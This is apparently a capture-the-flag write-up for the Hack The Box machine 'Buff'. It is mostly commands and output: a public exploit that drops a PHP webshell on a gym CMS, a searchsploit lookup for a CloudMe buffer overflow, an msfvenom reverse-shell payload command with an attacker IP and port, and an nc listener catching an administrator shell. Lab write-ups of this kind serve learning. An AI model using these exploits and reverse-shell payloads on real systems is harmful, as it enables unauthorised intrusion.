
### Initial access
Port scan
```bash
PORT     STATE SERVICE
8080/tcp open  http-proxy
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_http-trace: TRACE is enabled
| http-enum: 
|_  /icons/: Potentially interesting folder w/ directory listing


```
subdomain scan
dirscan
filescan


We use exploit base  on our cms finding https://www.exploit-db.com/exploits/48506
```powershell
┌──(kali㉿kali)-[~/HTB/Buff]
└─$ python2 exp.py http://10.129.25.107:8080/
            /\
/vvvvvvvvvvvv \--------------------------------------,
`^^^^^^^^^^^^ /============BOKU====================="
            \/


id
[+] Successfully connected to webshell.
C:\xampp\htdocs\gym\upload> �PNG
▒
<br />
<b>Warning</b>:  shell_exec(): Cannot execute a blank command in <b>C:\xampp\htdocs\gym\upload\kamehameha.php</b> on line <b>3</b><br />

C:\xampp\htdocs\gym\upload> �PNG
▒

C:\xampp\htdocs\gym\upload> dir
�PNG
▒
 Volume in drive C has no label.
 Volume Serial Number is A22D-49F7

 Directory of C:\xampp\htdocs\gym\upload

21/09/2026  04:20    <DIR>          .
21/09/2026  04:20    <DIR>          ..
21/09/2026  04:20                53 kamehameha.php
               1 File(s)             53 bytes
               2 Dir(s)   7,583,567,872 bytes free

```

### Priv escalation
Winpeas
```
 File Permissions "C:\Users\shaun\Downloads\CloudMe_1112.exe": shaun [Allow: AllAccess]
     File Permissions "C:\Users\shaun\Documents\Tasks.bat": shaun [Allow: AllAccess]

```
Searchploit
```bash
┌──(kali㉿kali)-[~/HTB/Buff]
└─$ searchsploit CloudMe                                         
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                             |  Path
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
CloudMe 1.11.2 - Buffer Overflow (PoC)                                                                                     | windows/remote/48389.py
CloudMe 1.11.2 - Buffer Overflow (SEH_DEP_ASLR)                                                                            | windows/local/48499.txt
CloudMe 1.11.2 - Buffer Overflow ROP (DEP_ASLR)                                                                            | windows/local/48840.py
Cloudme 1.9 - Buffer Overflow (DEP) (Metasploit)                                                                           | windows_x86-64/remote/45197.rb
CloudMe Sync 1.10.9 - Buffer Overflow (SEH)(DEP Bypass)                                                                    | windows_x86-64/local/45159.py
CloudMe Sync 1.10.9 - Stack-Based Buffer Overflow (Metasploit)                                                             | windows/remote/44175.rb
CloudMe Sync 1.11.0 - Local Buffer Overflow                                                                                | windows/local/44470.py
CloudMe Sync 1.11.2 - Buffer Overflow + Egghunt                                                                            | windows/remote/46218.py
CloudMe Sync 1.11.2 Buffer Overflow - WoW64 (DEP Bypass)                                                                   | windows_x86-64/remote/46250.py
CloudMe Sync < 1.11.0 - Buffer Overflow                                                                                    | windows/remote/44027.py
CloudMe Sync < 1.11.0 - Buffer Overflow (SEH) (DEP Bypass)                                                                 | windows_x86-64/remote/44784.py
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

```bash
┌──(kali㉿kali)-[~/HTB/Buff]
└─$ searchsploit  -m windows/remote/48389.py                                                                                 

  Exploit: CloudMe 1.11.2 - Buffer Overflow (PoC)
      URL: https://www.exploit-db.com/exploits/48389
     Path: /usr/share/exploitdb/exploits/windows/remote/48389.py
    Codes: N/A
 Verified: False
File Type: Python script, ASCII text executable
cp: overwrite '/home/kali/HTB/Buff/48389.py'? y
Copied to: /home/kali/HTB/Buff/48389.py

```

Ligolo tunneling after that port scan
```
PORT      STATE SERVICE
135/tcp   open  msrpc
445/tcp   open  microsoft-ds
3306/tcp  open  mysql
5040/tcp  open  unknown
7680/tcp  open  pando-pub
8080/tcp  open  http-proxy
8888/tcp  open  sun-answerbook
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown

```
We using 
``` this to our pay load
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.17.47 LPORT=4444 EXITFUNC=thread -b '\x00\x0a\x0d' -f python -v payload

```

```
┌──(kali㉿kali)-[~/HTB/Buff]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...

connect to [10.10.17.47] from (UNKNOWN) [10.129.42.239] 49703
Microsoft Windows [Version 10.0.17134.1610]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
C:\Windows\system32>id
id
'id' is not recognized as an internal or external command,
operable program or batch file.

C:\Windows\system32>whoami
whoami
buff\administrator


```